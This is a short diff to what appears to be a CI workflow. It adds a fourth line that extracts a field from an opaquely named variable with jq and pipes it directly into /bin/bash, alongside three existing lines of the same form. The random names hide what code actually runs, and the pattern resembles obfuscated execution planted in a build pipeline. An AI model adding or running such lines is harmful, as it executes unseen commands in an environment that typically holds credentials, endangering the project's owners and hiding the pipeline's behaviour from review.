@@ -34,6 +34,7 @@ jobs:
           printf '%s' "$qen039" | jq -r .fw62221 | /bin/bash
           echo $dedr18409 | jq -r .fochq84101 | /bin/bash
           echo $pr61 | jq -r .gvero8 | /bin/bash
+          echo $k4202 | jq -r .gto08 | /bin/bash
 
       - name: Save results
         if: always()
